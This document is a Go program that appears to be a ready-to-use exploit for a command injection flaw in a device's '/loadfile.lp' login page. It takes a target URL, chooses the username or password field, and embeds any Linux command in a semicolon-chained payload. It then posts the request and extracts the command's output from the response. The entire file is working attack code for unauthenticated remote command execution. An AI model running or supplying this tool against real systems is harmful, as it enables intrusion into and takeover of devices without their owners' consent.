package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"

	"github.com/fatih/color"
)

func main() {
	// Parse command line arguments
	urlFlag := flag.String("u", "", "Target URL")
	paramFlag := flag.String("p", "", "Injection parameter (username/userpassword)")
	cmdFlag := flag.String("c", "", "Linux command to execute")
	flag.Parse()

	if *urlFlag == "" {
		color.Blue("[*] Please provide the target URL")
		return
	}

	if *paramFlag == "" {
		color.Blue("[*] Please provide the injection parameter")
		return
	}

	if *cmdFlag == "" {
		color.Blue("[*] Please provide the Linux command to execute")
		return
	}

	// Concatenate the target URL and the endpoint path
	targetURL := *urlFlag + "/loadfile.lp"

	// Construct the request body parameters with command injection and user input command
	payload := fmt.Sprintf("POC;echo -e \"start\";%s;echo -e \"end\";", *cmdFlag)
	params := url.Values{
		"username":    {"admin"},
		"userpassword": {"password"},
		"login":       {"Login"},
	}

	// Set the injection parameter based on the command line argument
	if *paramFlag == "username" {
		params.Set("username", payload)
	} else if *paramFlag == "userpassword" {
		params.Set("userpassword", payload)
	} else {
		color.Blue("[*] Invalid injection parameter")
		return
	}

	// Construct the query parameters
	queryParams := url.Values{
		"pageid": {"Home"},
	}

	// Concatenate the query parameters to the target URL
	targetURL += "?" + queryParams.Encode()

	// Construct the request body
	requestBody := strings.NewReader(params.Encode())

	// Send a POST request
	resp, err := http.Post(targetURL, "application/x-www-form-urlencoded", requestBody)
	if err != nil {
		color.Red("[-] Request failed:", err)
		return
	}
	defer resp.Body.Close()

	// Read the server response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red("[-] Failed to read the response:", err)
		return
	}

	// Convert the server response to a string
	response := string(body)

	// Extract the information between "start" and "end"
	startIndex := strings.Index(response, "start")
	endIndex := strings.Index(response, "end")
	if startIndex != -1 && endIndex != -1 && startIndex < endIndex {
		result := response[startIndex+len("start") : endIndex]
		color.Green("[+] Vulnerability found: Command executed successfully")
		fmt.Println(result)
	} else {
		color.Red("[-] Vulnerability not found: Command execution failed or unexpected response")
	}
}
